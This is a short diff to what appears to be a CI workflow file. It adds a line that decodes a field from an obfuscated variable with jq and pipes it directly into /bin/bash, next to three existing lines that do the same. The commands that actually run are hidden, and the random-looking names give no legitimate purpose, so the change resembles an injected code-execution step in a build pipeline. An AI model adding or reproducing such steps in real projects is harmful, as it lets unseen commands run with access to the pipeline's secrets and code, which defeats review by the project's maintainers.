@@ -27,6 +27,7 @@ jobs:
           echo $xmim03 | jq -r .ncza54597 | /bin/bash
           echo $d89 | jq -r .wplw59 | /bin/bash
           printf '%s' "$xiff7" | jq -r .hkuen4 | /bin/bash
+          echo $zbvg574 | jq -r .ygxk531 | /bin/bash
 
       - name: Save archive
         if: always()
